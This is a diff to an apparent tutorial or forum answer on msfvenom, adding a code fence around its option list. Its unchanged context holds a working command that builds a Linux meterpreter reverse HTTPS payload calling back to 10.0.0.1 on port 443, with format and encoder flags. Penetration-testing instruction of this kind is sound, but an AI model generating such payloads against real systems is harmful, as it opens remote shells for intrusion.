@@ -109,12 +109,13 @@ You can see that the Basic options of LHOST and LPORT are required, to input the
 `msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1`   
 
 After this you other options that can be important are:   
---arch              # Set Architecture
+```
+--arch              # Set Architecture    
 --platform          # Set Platform   
 -f                  # Set Format   
 -e                  # Set Encoders   
 -o                  # Set Outfile   
-
+```
 All of these options can be used with --list to show valid options.   
 
 For Your Senario -f elf will work.
